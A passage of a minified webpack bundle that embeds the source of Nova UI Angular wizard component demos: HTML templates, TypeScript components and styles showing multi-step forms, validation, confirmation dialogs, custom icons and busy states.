     WizardCustomExampleComponent,\n        WizardCustomComponent,\n        WizardDialogExampleComponent,\n        WizardBusyExampleComponent,\n        WizardCustomFooterExampleComponent,\n        WizardDynamicExampleComponent,\n        WizardRemoveStepExampleComponent,\n        WizardAsyncFormValidationExampleComponent,\n        WizardWithCustomIconsExampleComponent,\n        WizardRestoreStateExampleComponent,\n        WizardStepChangeExampleComponent,\n        WizardResponsiveHeaderExampleComponent,\n        WizardWithConfirmationDialogOnCancelExampleComponent,\n        WizardTooltipExampleComponent,\n        WizardV2TestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("wizard-v2"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class WizardV2Module {}\n'},57284:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-vertical>\n    \x3c!--  content of the 1st step --\x3e\n    <nui-wizard-step-v2 i18n-label label="First step">\n        \x3c!-- content of the current step --\x3e\n        <span i18n>This is the first step of our vertical wizard.</span>\n\n        \x3c!-- content of the footer --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--  content of the 2nd step --\x3e\n    <nui-wizard-step-v2 i18n-label label="Second step">\n        \x3c!-- content of the current step --\x3e\n        <span i18n>This is the second step of our vertical wizard.</span>\n\n        \x3c!-- content of the footer --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--  content of the final step --\x3e\n    <nui-wizard-step-v2 i18n-label label="Final step">\n        <span i18n>We finally reached our last step!</span>\n        \x3c!-- Notice how both label and footer can be placed anywhere in the content of wizard step --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #wizardPrevious>\n        <button type="button" nuiWizardPrevious nui-button icon="caret-left">\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n        >\n            Next\n        </button>\n    </ng-template>\n</nui-wizard-vertical>\n'},58628:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n@Component({\n    selector: "nui-wizard-vertical-example",\n    templateUrl: "./wizard-vertical.example.component.html",\n})\nexport class WizardVerticalExampleComponent {}\n'},63677:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="form" *ngIf="form">\n    <nui-wizard-horizontal #wizard>\n        \x3c!--  This defines the first step of the wizard --\x3e\n        <nui-wizard-step-v2\n            i18n-label\n            label="Person Details"\n            formGroupName="personDetails"\n            [stepControl]="form.get([\'personDetails\'])"\n        >\n            \x3c!-- the current step content --\x3e\n            <div class="step-content-wrapper">\n                <h2>Person Details</h2>\n                <nui-form-field\n                    [control]="form.get([\'personDetails\', \'firstName\'])"\n                    i18n-caption\n                    caption="First name"\n                >\n                    <nui-textbox\n                        formControlName="firstName"\n                        customBoxWidth="150px"\n                    ></nui-textbox>\n                    <nui-validation-message\n                        for="required"\n                        *ngIf="\n                            form.get([\'personDetails\', \'firstName\'])?.errors\n                                ?.required\n                        "\n                        i18n\n                    >\n                        First name is required\n                    </nui-validation-message>\n                </nui-form-field>\n\n                <nui-form-field\n                    [control]="form.get([\'personDetails\', \'lastName\'])"\n                    i18n-caption\n                    caption="Last name"\n                >\n                    <nui-textbox\n                        formControlName="lastName"\n                        customBoxWidth="150px"\n                    ></nui-textbox>\n                    <nui-validation-message\n                        for="required"\n                        *ngIf="\n                            form.get([\'personDetails\', \'lastName\'])?.errors\n                                ?.required\n                        "\n                        i18n\n                    >\n                        Last name is required\n                    </nui-validation-message>\n                </nui-form-field>\n                \x3c!-- content of the footer --\x3e\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="\n                            wizardNext;\n                            context: { form: \'personDetails\' }\n                        "\n                    ></ng-container>\n                </ng-template>\n            </div>\n        </nui-wizard-step-v2>\n\n        <nui-wizard-step-v2\n            i18n-label\n            label="Contact Details"\n            formGroupName="contactDetails"\n            [stepControl]="form.get([\'contactDetails\'])"\n        >\n            <div class="step-content-wrapper">\n                <h2>Contact Details</h2>\n                <nui-form-field\n                    [control]="form.get([\'contactDetails\', \'email\'])"\n                    i18n-caption\n                    caption="Email"\n                >\n                    <nui-textbox\n                        type="email"\n                        formControlName="email"\n                        customBoxWidth="150px"\n                    ></nui-textbox>\n                    <nui-validation-message\n                        for="required"\n                        *ngIf="\n                            form.get([\'contactDetails\', \'email\'])?.errors\n                                ?.required\n                        "\n                        i18n\n                    >\n                        This is required\n                    </nui-validation-message>\n\n                    <nui-validation-message\n                        for="email"\n                        *ngIf="\n                            form.get([\'contactDetails\', \'email\'])?.errors?.email\n                        "\n                        i18n\n                    >\n                        Invalid email\n                    </nui-validation-message>\n                </nui-form-field>\n                <nui-form-field\n                    [control]="form.get([\'contactDetails\', \'phone\'])"\n                    i18n-caption\n                    caption="Phone"\n                >\n                    <nui-textbox\n                        type="phone"\n                        formControlName="phone"\n                        customBoxWidth="150px"\n                    ></nui-textbox>\n                    <nui-validation-message\n                        for="required"\n                        *ngIf="\n                            form.get([\'contactDetails\', \'phone\'])?.errors\n                                ?.required\n                        "\n                        i18n\n                    >\n                        This is required\n                    </nui-validation-message>\n                </nui-form-field>\n\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="\n                            wizardNext;\n                            context: { form: \'contactDetails\' }\n                        "\n                    ></ng-container>\n                </ng-template>\n            </div>\n        </nui-wizard-step-v2>\n\n        <nui-wizard-step-v2\n            i18n-label\n            label="Final step"\n            formGroupName="confirm"\n            [stepControl]="form.get([\'confirm\'])"\n        >\n            <div class="step-content-wrapper">\n                <h2 i18n>Confirm your data</h2>\n                <ul>\n                    <li>\n                        First name:\n                        {{ form.get(["personDetails", "firstName"]).value }}\n                    </li>\n                    <li>\n                        Last name:\n                        {{ form.get(["personDetails", "lastName"]).value }}\n                    </li>\n                    <li>\n                        Email: {{ form.get(["contactDetails", "email"]).value }}\n                    </li>\n                    <li *ngIf="form.get([\'contactDetails\', \'phone\']).value">\n                        Phone: {{ form.get(["contactDetails", "phone"]).value }}\n                    </li>\n                </ul>\n                <nui-form-field [control]="form.get([\'confirm\', \'confirmed\'])">\n                    <nui-checkbox formControlName="confirmed" i18n required>\n                        Confirm\n                    </nui-checkbox>\n                    <nui-validation-message for="required" i18n>\n                        Confirmation is required\n                    </nui-validation-message>\n                </nui-form-field>\n\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="\n                            wizardSubmit;\n                            context: { formControlName: \'confirm\' }\n                        "\n                    ></ng-container>\n                </ng-template>\n            </div>\n        </nui-wizard-step-v2>\n\n        \x3c!-- content of the confirmation dialog --\x3e\n        <ng-template #confirmDialog let-close="close">\n            <nui-dialog-header\n                title="Really want to leave?"\n                i18n-title\n                (closed)="close()"\n            ></nui-dialog-header>\n            <div class="dialog-body">\n                <p i18n>\n                    There is at least one accomplished step within this wizard.\n                    Are you sure you want to leave?\n                </p>\n            </div>\n            <nui-dialog-footer>\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="action"\n                    (click)="close()"\n                    i18n\n                >\n                    Cancel\n                </button>\n                <button\n                    nui-button\n                    type="button"\n                    (click)="resetWizard(); close()"\n                    i18n\n                >\n                    Leave\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n\n        \x3c!-- content of the cancel button --\x3e\n        <ng-template #wizardCancel>\n            <button\n                type="button"\n                displayStyle="action"\n                nui-button\n                (click)="openConfirmationDialog(confirmDialog)"\n                i18n\n            >\n                Cancel\n            </button>\n        </ng-template>\n\n        \x3c!-- content of the previous button --\x3e\n        <ng-template #wizardPrevious>\n            <button\n                type="button"\n                nuiWizardPrevious\n                nui-button\n                icon="caret-left"\n                i18n\n            >\n                Back\n            </button>\n        </ng-template>\n\n        \x3c!-- content of the next button --\x3e\n        <ng-template #wizardNext let-form="form">\n            <button\n                nuiWizardNext\n                type="button"\n                nui-button\n                displayStyle="primary"\n                icon="caret-right"\n                iconRight="true"\n                (click)="validate(form)"\n                i18n\n            >\n                Next\n            </button>\n        </ng-template>\n\n        \x3c!-- content of the submit button --\x3e\n        <ng-template #wizardSubmit let-formControlName="formControlName">\n            <button\n                type="button"\n                nui-button\n                displayStyle="primary"\n                (click)="onSubmit(formControlName)"\n                i18n\n            >\n                Submit\n            </button>\n        </ng-template>\n    </nui-wizard-horizontal>\n</form>\n'},94225:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-spaces";\n\n.step-content-wrapper {\n    padding: 0 @nui-space-md @nui-space-md;\n}\n'},99689:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    Inject,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport {\n    DialogService,\n    NuiDialogRef,\n    ToastService,\n    WizardHorizontalComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-with-confirmation-dialog-on-cancel-example",\n    templateUrl:\n        "./wizard-with-confirmation-dialog-on-cancel.example.component.html",\n    styleUrls: [\n        "./wizard-with-confirmation-dialog-on-cancel.example.component.less",\n    ],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class WizardWithConfirmationDialogOnCancelExampleComponent {\n    public confirmationDialog: NuiDialogRef;\n    public form;\n\n    @ViewChild("wizard") private wizard: WizardHorizontalComponent;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        private toastService: ToastService,\n        private formBuilder: FormBuilder,\n        public cd: ChangeDetectorRef\n    ) {\n        this.form = this.formBuilder.group({\n            personDetails: this.formBuilder.group({\n                firstName: ["", [Validators.required, Validators.minLength(3)]],\n                lastName: ["", [Validators.required, Validators.minLength(3)]],\n            }),\n            contactDetails: this.formBuilder.group({\n                email: ["", [Validators.required, Validators.email]],\n                phone: [""],\n            }),\n            confirm: this.formBuilder.group({\n                confirmed: [false, Validators.requiredTrue],\n            }),\n        });\n    }\n\n    // Open confirmation dialog\n    public openConfirmationDialog(content: TemplateRef<string>): void {\n        if (this.wizard.selectedIndex === 0) {\n            this.resetWizard();\n            return;\n        }\n\n        this.confirmationDialog = this.dialogService.open(content, {\n            size: "sm",\n            windowClass: "active-dialog",\n        });\n    }\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    // Validate form before changing selected step\n    public validate(formGroup: string): void {\n        this.form.get(formGroup)?.markAllAsTouched();\n    }\n\n    public onSubmit(formControlName: string): void {\n        this.validate(formControlName);\n\n        if (!this.form.valid) {\n            return;\n        }\n\n        this.toastService.info({\n            title: $localize`Form was successfully submitted.`,\n            options: {\n                timeOut: 5000,\n                extendedTimeOut: 2000,\n            },\n        });\n        this.wizard.reset();\n    }\n}\n'},80553:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizard>\n    <nui-wizard-step-v2 i18n-label label="First step">\n        <div class="p-5">\n            <span i18n>This is the first step of our wizard.</span>\n        </div>\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--\n        See how we use the \'stepIconsConfig\' input here to override the global icons configuration\n        for this particular wizard step\n    --\x3e\n    <nui-wizard-step-v2\n        i18n-label\n        label="Second step"\n        [stepStateConfig]="secondStepIconConfig"\n    >\n        <div class="p-5">\n            <span i18n>This is the second step of our wizard.</span>\n        </div>\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <nui-wizard-step-v2 i18n-label label="Final step">\n        <div class="p-5">\n            <span i18n>We finally reached our last step</span>\n        </div>\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <button\n                type="button"\n                displayStyle="primary"\n                nui-button\n                (click)="finishWizard()"\n                i18n\n            >\n                Finish\n            </button>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #wizardCancel>\n        <button\n            type="button"\n            displayStyle="action"\n            nui-button\n            (click)="resetWizard()"\n            i18n\n        >\n            Cancel\n        </button>\n    </ng-template>\n\n    <ng-template #wizardPrevious>\n        <button\n            type="button"\n            nuiWizardPrevious\n            nui-button\n            icon="caret-left"\n            i18n\n        >\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n            i18n\n        >\n            Next\n        </button>\n    </ng-template>\n</nui-wizard-horizontal>\n'},30309:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport {\n    IWizardConfig,\n    ToastService,\n    WizardHorizontalComponent,\n    WizardStepStateConfig,\n    WIZARD_CONFIG,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-with-custom-icons-example",\n    templateUrl: "./wizard-with-custom-icons.example.component.html",\n    providers: [\n        {\n            provide: WIZARD_CONFIG,\n            useValue: {\n                stepState: {\n                    active: {\n                        icon: "email",\n                        iconColor: "orange",\n                    },\n                },\n            } as IWizardConfig,\n        },\n    ],\n})\nexport class WizardWithCustomIconsExampleComponent {\n    @ViewChild("wizard") wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public secondStepIconConfig: Partial<WizardStepStateConfig> = {\n        initial: {\n            icon: "execute",\n            iconColor: "primary-blue",\n        },\n        visited: {\n            icon: "star-full",\n            iconColor: "light-blue",\n        },\n        active: {\n            icon: "star-full",\n            iconColor: "orange",\n        },\n    };\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},72904:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./wizard-docs/wizard-docs.example.component";\nexport * from "./wizard-dialog/wizard-dialog.example.component";\nexport * from "./wizard-simple/wizard-simple.example.component";\nexport * from "./wizard-busy/wizard-busy.example.component";\nexport * from "./wizard-validation/wizard-validation.example.component";\nexport * from "./wizard-disabled/wizard-disabled.example.component";\nexport * from "./wizard-hide/wizard-hide.example.component";\nexport * from "./wizard-dynamic/wizard-dynamic.example.component";\nexport * from "./wizard-additional-button/wizard-additional-button.example.component";\nexport * from "./wizard-confirmation-dialog/wizard-confirmation-dialog.example.component";\nexport * from "./wizard-visual-test/wizard-visual-test.component";\nexport * from "./wizard-constant-height/wizard-constant-height.example.component";\nexport * from "./wizard-custom-step-line-width/wizard-custom-step-line-width.example.component";\nexport * from "./wizard-steps/wizard-steps.example.component";\nexport * from "./wizard-dynamic-remove/wizard-dynamic-remove.example.component";\nexport * from "./wizard-reset-step/wizard-reset-step-example.component";\nexport * from "./wizard-with-separate-step-headings/wizard-with-separate-step-headings.example.component";\n'},40832:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    #wizardComponent\n    id="nui-demo-wizard-add-additional-button"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        #wizardStepAdditional\n        [title]="\'Additional button step\'"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <button\n        nui-button\n        type="button"\n        id="nui-demo-additional-button"\n        (click)="onAdditionalButtonClick()"\n        i18n\n    >\n        Additional button\n    </button>\n</nui-wizard>\n<ng-template #step1>\n    <p i18n>There is example of additional button in footer</p>\n</ng-template>\n'},67264:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-additional-button-example",\n    templateUrl: "./wizard-additional-button.example.component.html",\n})\nexport class WizardAdditionalButtonExampleComponent {\n    constructor(@Inject(ToastService) private toastService: ToastService) {}\n\n    public onAdditionalButtonClick(): void {\n        this.toastService.info({\n            message: $localize`Additional button clicked!`,\n        });\n    }\n}\n'},76754:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #stepBusy>\n    <p i18n>Welcome!</p>\n</ng-template>\n<ng-template #step2>\n    <nui-checkbox\n        name="nui-demo-checkbox"\n        i18n-title\n        title="Check box with help text"\n        i18n-hint\n        hint="This is some help text"\n        required="true"\n        [disabled]="isBusy"\n        [value]="false"\n        i18n\n        >Check box with help text\n    </nui-checkbox>\n    <nui-checkbox\n        name="nui-demo-checkbox-plain"\n        [checked]="true"\n        [value]="false"\n        [disabled]="isBusy"\n        i18n\n        >Plain checkbox\n    </nui-checkbox>\n</ng-template>\n<div nui-busy [busy]="isBusy">\n    <nui-wizard\n        #wizardComponent\n        id="nui-demo-wizard-busy"\n        finishText="Finish"\n        i18n-finishText\n    >\n        <nui-wizard-step\n            i18n-title\n            title="Make step busy"\n            [stepTemplate]="stepBusy"\n        ></nui-wizard-step>\n        <nui-wizard-step\n            i18n-title\n            title="Final"\n            [stepTemplate]="step2"\n        ></nui-wizard-step>\n    </nui-wizard>\n    <nui-spinner size="large" message="Fetching data..."></nui-spinner>\n</div>\n\n<button\n    nui-button\n    type="button"\n    id="nui-demo-busy-button"\n    (click)="toggleStepBusy()"\n    i18n\n>\n    Toggle busy on current step\n</button>\n<button nui-button type="button" (click)="toggleBusy()">\n    Toggle busy on all wizard content\n</button>\n'},15630:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { IBusyConfig, WizardComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-busy-example",\n    templateUrl: "./wizard-busy.example.component.html",\n})\nexport class WizardBusyExampleComponent {\n    @ViewChild("wizardComponent") wizardComponent: WizardComponent;\n\n    public isBusy = false;\n\n    public busyConfig: IBusyConfig = {\n        busy: false,\n        message: $localize`Step is busy`,\n    };\n\n    constructor() {}\n\n    public toggleStepBusy(): void {\n        /* Switch off spinner of all content. Just to avoid two spinners */\n        this.isBusy = false;\n        this.busyConfig.busy = !this.busyConfig.busy;\n        this.wizardComponent.navigationControl.next({\n            busyState: this.busyConfig,\n            allowStepChange: !this.busyConfig.busy,\n        });\n    }\n\n    public toggleBusy(): void {\n        /* Switch off spinner of step content. Just to avoid two spinners */\n        this.busyConfig.busy = false;\n        this.isBusy = !this.isBusy;\n    }\n}\n'},17880:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard\n    id="nui-demo-wizard-confirmation-dialog"\n    (cancel)="openConfirmationDialog($event, content)"\n    finishText="Finish"\n    i18n-finishText\n>\n    <nui-wizard-step\n        i18n-title\n        title="First"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="Second"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n    <nui-wizard-step\n        i18n-title\n        title="Third"\n        [stepTemplate]="step1"\n    ></nui-wizard-step>\n</nui-wizard>\n<ng-template #step1>\n    <p i18n>Wizard cancel method behavior</p>\n</ng-template>\n<ng-template #content let-close="close">\n    <nui-dialog-header\n        i18n-title\n        title="Really want to leave?"\n        (close)="onButtonClick()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            There is at least one completed step in this wizard. Are you sure\n            you want to leave?\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onButtonClick(\'Stay\')" i18n>\n            Stay\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onButtonClick(\'Leave\')"\n            i18n\n        >\n            Leave\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},82280:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-confirmation-dialog-example",\n    templateUrl: "./wizard-confirmation-dialog.example.component.html",\n})\nexport class WizardConfirmationDialogExampleComponent {\n    public activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public openConfirmationDialog(\n        $event: boolean,\n        content: 